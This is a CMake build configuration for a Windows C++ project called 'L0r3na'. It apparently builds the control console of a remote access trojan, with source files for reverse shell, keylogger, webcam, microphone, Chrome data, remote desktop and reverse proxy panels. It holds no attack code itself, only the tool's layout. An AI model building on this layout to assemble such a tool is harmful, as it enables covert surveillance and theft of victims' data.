cmake_minimum_required(VERSION 3.14 FATAL_ERROR)

project(L0r3na LANGUAGES CXX C)

set(CMAKE_CXX_STANDARD 11)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(wxBUILD_SHARED OFF)
set(wxWidgets_CONFIGURATION msw)
set(wxWidgets_INCLUDE_DIRS "./wxWidgets/include")
add_subdirectory(cliente)
add_subdirectory(wxWidgets)

set(SRCS main.cpp
         misc.cpp
         server.cpp
         frame_cliente.cpp
         frame_remote_desktop.cpp
         panel_file_manager.cpp
         file_editor.cpp
         file_encryption.cpp
         panel_process_manager.cpp
         panel_reverse_shell.cpp
         panel_transferencias.cpp
         panel_microfono.cpp
         panel_keylogger.cpp
         panel_camara.cpp
         panel_wmanager.cpp
         panel_info_chrome.cpp
         panel_usuarios.cpp
         panel_reverse_proxy.cpp
         frame_crypt_db.cpp
         aes256/aes256.cpp
         notify.cpp
         base64/base64.cpp
         #zlib/compress.c 
         #zlib/inflate.c 
         #zlib/infback.c 
         #zlib/inftrees.c 
         #zlib/trees.c 
         #zlib/inffast.c 
         #zlib/adler32.c 
         #zlib/deflate.c 
         #zlib/crc32.c 
         #zlib/zutil.c 
         #zlib/uncompr.c
)

add_executable(main WIN32 ${SRCS})
target_include_directories(main PRIVATE ${wxWidgets_INCLUDE_DIRS})
target_link_libraries(main ${wxWidgets_LIBRARIES} wxcore wxpng wxnet wxaui wxhtml wxscintilla wxstc winmm winsqlite3 gdiplus)
